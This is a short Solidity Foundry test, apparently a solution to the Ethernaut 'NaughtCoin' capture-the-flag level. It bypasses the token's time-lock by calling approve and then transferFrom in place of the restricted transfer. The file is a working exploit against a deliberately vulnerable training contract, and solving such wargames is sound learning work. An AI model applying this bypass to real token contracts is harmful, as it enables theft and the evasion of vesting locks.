// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {NaughtCoin} from "../instances/Ilevel15.sol";

contract Attacker is Test {
    function test() external {
        vm.startBroadcast();
        NaughtCoin nc = new NaughtCoin(msg.sender);
        uint myBal = nc.balanceOf(msg.sender);
        console.log("Current balance is: ", myBal);
        nc.approve(msg.sender, myBal);
        nc.transferFrom(msg.sender, address(nc), myBal);
        console.log("New balance is: ", nc.balanceOf(msg.sender));
        vm.stopBroadcast();
    }
}
